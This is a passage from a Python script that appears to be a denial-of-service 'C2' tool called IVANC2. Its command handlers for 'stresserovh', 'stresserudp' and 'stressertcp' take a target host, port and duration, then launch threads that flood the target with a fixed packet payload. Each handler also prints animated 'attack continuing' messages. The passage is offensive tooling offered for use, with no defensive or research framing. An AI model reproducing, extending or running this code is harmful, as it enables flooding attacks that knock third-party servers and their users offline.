					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresserovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stresserudp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stressertcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 1:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 1:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system("cls")
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

